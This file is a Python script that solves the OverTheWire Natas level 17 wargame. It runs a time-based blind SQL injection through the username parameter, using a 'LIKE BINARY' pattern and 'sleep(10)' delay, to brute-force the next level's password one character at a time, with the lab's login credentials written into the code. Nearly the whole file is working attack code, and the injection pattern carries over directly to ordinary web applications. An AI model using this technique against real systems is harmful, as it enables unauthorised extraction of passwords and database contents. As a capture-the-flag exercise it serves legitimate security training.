import requests
from requests.auth import HTTPBasicAuth
from requests_toolbelt.utils import dump
URL = "http://natas17.natas.labs.overthewire.org/index.php"
charString = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
strA = 'natas18" AND password LIKE BINARY"'
key = ""
filteredstring = "CDFIKOPRdghjlmpqsvwxy470"

"""
for a in charString:
    tryKey = a
    PARAMS = {'username':strA + '%' + tryKey + '%" and sleep(5) #'}
    r = requests.get(url = URL, auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), params = PARAMS)
    if r.elapsed.seconds >= 5:
        filteredstring += tryKey
        print(filteredstring)
"""
#Had to keep sleep(5) because of shitty internet.
while(len(key)<32):
    for a in filteredstring:
        tryKey = key + a
        PARAMS = {'username':strA + tryKey + '%" and sleep(10) #'}
        r = requests.get(url = URL, auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), params = PARAMS)
        
        if r.elapsed.seconds >= 10:
            key = tryKey
            print(key)
            break

